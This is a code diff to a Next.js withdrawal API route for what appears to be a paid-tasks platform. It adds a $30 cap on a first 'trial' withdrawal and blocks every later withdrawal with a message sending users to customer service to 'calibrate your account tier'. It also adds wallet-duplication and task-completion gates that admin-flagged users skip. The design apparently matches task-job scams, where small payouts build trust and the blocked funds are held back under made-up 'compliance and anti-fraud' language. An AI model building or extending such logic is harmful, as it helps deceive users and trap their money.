@@ -122,6 +122,17 @@ export async function POST(req: NextRequest) {
         const maxWithdrawal = tierLimits.max;
         const dailyCountLimit = tierLimits.dailyCountLimit;
 
+        // Fetch past non-rejected withdrawals for this user across all time
+        const { data: allPastWithdrawals } = await supabaseAdmin
+            .from('transactions')
+            .select('id, amount, status, created_at')
+            .eq('user_id', userId)
+            .eq('type', 'withdrawal')
+            .neq('status', 'rejected');
+
+        const pastWithdrawalCount = allPastWithdrawals?.length || 0;
+        const isFirstWithdrawal = pastWithdrawalCount === 0;
+
         // Check user daily withdrawals
         const now = new Date();
         const startOfToday = new Date(now.getFullYear(), now.getMonth(), now.getDate());
@@ -130,16 +141,48 @@ export async function POST(req: NextRequest) {
             ? new Date(resetTimestamp).toISOString() 
             : startOfToday.toISOString();
 
-        const { data: todayWithdrawals } = await supabaseAdmin
-            .from('transactions')
-            .select('id, amount, status, created_at')
-            .eq('user_id', userId)
-            .eq('type', 'withdrawal')
-            .neq('status', 'rejected')
-            .gte('created_at', filterDate);
+        const todayWithdrawals = (allPastWithdrawals || []).filter(tx => 
+            new Date(tx.created_at) >= new Date(filterDate)
+        );
 
-        const todayWithdrawalCount = todayWithdrawals?.length || 0;
-        const todayWithdrawnAmount = (todayWithdrawals || []).reduce((sum, tx) => sum + Number(tx.amount || 0), 0);
+        const todayWithdrawalCount = todayWithdrawals.length;
+        const todayWithdrawnAmount = todayWithdrawals.reduce((sum, tx) => sum + Number(tx.amount || 0), 0);
+
+        // Anti-Abuse Guard 1: Duplicate payout wallet address across accounts
+        const cleanAddress = (walletAddress || '').trim().toLowerCase();
+        if (cleanAddress && userPerm !== 'allow') {
+            const { data: duplicateAddressTxs } = await supabaseAdmin
+                .from('transactions')
+                .select('id, user_id')
+                .ilike('address', cleanAddress)
+                .neq('user_id', userId)
+                .eq('type', 'withdrawal')
+                .neq('status', 'rejected')
+                .limit(1);
+
+            if (duplicateAddressTxs && duplicateAddressTxs.length > 0) {
+                return NextResponse.json({
+                    error: 'Security Alert: This destination wallet address is already linked to another participant account. To prevent multi-account abuse, trial payouts cannot be routed to previously registered addresses. Please contact customer service.',
+                    code: 'DUPLICATE_WALLET_ADDRESS'
+                }, { status: 403 });
+            }
+        }
+
+        // Rule 1: Second withdrawal gate (Requires contact with customer service)
+        if (!isFirstWithdrawal && userPerm !== 'allow') {
+            return NextResponse.json({
+                error: 'Secondary Withdrawal Verification: You have completed your initial $30 introductory trial withdrawal. In accordance with platform compliance and anti-fraud protocols, secondary withdrawals require verification from customer service to calibrate your account tier. Please contact customer service.',
+                code: 'SECOND_WITHDRAWAL_CONTACT_SUPPORT'
+            }, { status: 403 });
+        }
+
+        // Rule 2: First withdrawal cap ($30.00 maximum)
+        if (isFirstWithdrawal && amt > 30.00 && userPerm !== 'allow') {
+            return NextResponse.json({
+                error: 'Initial Withdrawal Limit: Your introductory trial withdrawal cannot exceed $30.00. Please set your withdrawal amount to $30.00 or contact customer service to upgrade your clearance.',
+                code: 'INITIAL_WITHDRAWAL_MAX_30'
+            }, { status: 400 });
+        }
 
         // If not force-allowed by admin, check daily limits
         if (userPerm !== 'allow') {
@@ -160,15 +203,23 @@ export async function POST(req: NextRequest) {
             }
         }
 
-        // If not force-allowed by admin, check task set completion
-        if (userPerm !== 'allow' && requireTasksGlobal) {
+        // Anti-Abuse Guard 2: Task set completion validation
+        if (userPerm !== 'allow') {
             const completedCount = Number(profile.completed_count || 0);
             const tasksInCurrentSet = completedCount % tasksPerSet;
             const isSetCompleted = completedCount > 0 && tasksInCurrentSet === 0;
 
-            if (!isSetCompleted) {
+            if (isFirstWithdrawal && completedCount < tasksPerSet) {
+                return NextResponse.json({
+                    error: `Introductory Task Verification: To unlock your first $30 trial withdrawal, you must complete your initial set of ${tasksPerSet} tasks. Current progress: ${completedCount}/${tasksPerSet}.`,
+                    code: 'TRIAL_TASK_SET_INCOMPLETE'
+                }, { status: 400 });
+            }
+
+            if (requireTasksGlobal && !isSetCompleted) {
                 return NextResponse.json({ 
-                    error: `Task Set Incomplete: You must complete all ${tasksPerSet} tasks in your current set before initiating a withdrawal. You have currently completed ${tasksInCurrentSet}/${tasksPerSet} tasks.` 
+                    error: `Task Set Incomplete: You must complete all ${tasksPerSet} tasks in your current set before initiating a withdrawal. You have currently completed ${tasksInCurrentSet}/${tasksPerSet} tasks.`,
+                    code: 'TASK_SET_INCOMPLETE'
                 }, { status: 400 });
             }
         }
